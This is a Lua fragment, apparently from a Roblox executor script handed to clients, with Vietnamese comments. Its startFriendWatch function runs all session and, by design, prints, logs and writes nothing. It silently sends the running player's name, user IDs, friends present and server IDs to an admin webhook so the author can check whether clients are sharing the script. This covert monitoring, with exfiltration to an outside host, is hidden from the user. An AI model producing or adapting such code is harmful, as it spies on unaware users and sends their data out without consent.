--   chạy script → báo webhook admin (để coi client hook data thật hay toàn rủ bạn bè join theo). Chạy LIÊN TỤC cả session.
--   ⚠️ STEALTH: KHÔNG print/LOG/notify · KHÔNG writefile (chỉ 2 bảng LOCAL in-memory) · dùng IsFriendsWith (API thường).
--   Dedup: mỗi friend báo 1 lần/lần-hiện-diện; rời sv rồi rejoin thì báo lại. friendship query 1 lần/uid (giữ cả session).
-- ============================================================================
local function startFriendWatch()
    local url = CONFIG.FriendWatchWebhook
    if not (url and url ~= "" and httpRequest) then return end   -- rỗng = tắt, ko chạy gì (ko lộ)
    task.spawn(function()
        local checked  = {}   -- [uid] = bool (kết quả IsFriendsWith — query 1 lần/uid, GIỮ cả session để đỡ gọi web)
        local reported = {}   -- [uid] = true (đã báo; XOÁ khi friend rời sv → rejoin báo lại)
        local function isFriend(uid)
            if checked[uid] == nil then
                local ok, res = pcall(function() return LocalPlayer:IsFriendsWith(uid) end)
                checked[uid] = (ok and res) or false
            end
            return checked[uid]
        end
        local function report(friend, total)
            local embed = {
                title = "👥 Friend In Server",
                description = ("**%s** có bạn bè **%s** trong CÙNG server"):format(LocalPlayer.Name, friend.Name),
                color = 0xE67E22,
                fields = {
                    { name = "Watched acc", value = ("%s  `%d`"):format(LocalPlayer.Name, LocalPlayer.UserId), inline = true },
                    { name = "Friend",      value = ("%s  `%d`"):format(friend.Name, friend.UserId), inline = true },
                    { name = "Friends in server", value = tostring(total), inline = true },
                    { name = "Server", value = ("Place `%s` · Job `%s`"):format(tostring(game.PlaceId), tostring(game.JobId)), inline = false },
                },
                footer = { text = "peer audit" },
            }
            pcall(function() embed.timestamp = DateTime.now():ToIsoDate() end)
            pcall(postJson, url, { username = "W Audit", embeds = { embed } })   -- postJson reliable (retry+429); pcall im lặng
        end
        task.wait(CONFIG.FriendWatchStartDelay or 8)   -- ★ chờ QUA cửa sổ load (~3-4s) rồi mới scan lần đầu → friend-check KHÔNG góp phần freeze lúc vào game
        while true do
            pcall(function()
                local present, friendsNow = {}, {}
                for _, plr in ipairs(Players:GetPlayers()) do
                    if plr ~= LocalPlayer then
                        present[plr.UserId] = true
                        local needQuery = (checked[plr.UserId] == nil)   -- lần ĐẦU uid này = có gọi web IsFriendsWith (chậm)
                        if isFriend(plr.UserId) then friendsNow[#friendsNow + 1] = plr end
                        if needQuery then task.wait() end   -- ★ yield SAU mỗi web-call → main thread KHÔNG bị block dài dù IsFriendsWith chậm/chặn ở executor
                    end
                end
                for _, plr in ipairs(friendsNow) do
                    if not reported[plr.UserId] then
                        reported[plr.UserId] = true
                        report(plr, #friendsNow)
                    end
                end
                for uid in pairs(reported) do if not present[uid] then reported[uid] = nil end end   -- rời sv → cho phép báo lại lần sau (GIỮ checked)
            end)
            task.wait(CONFIG.FriendWatchInterval or 10)
        end
    end)
end

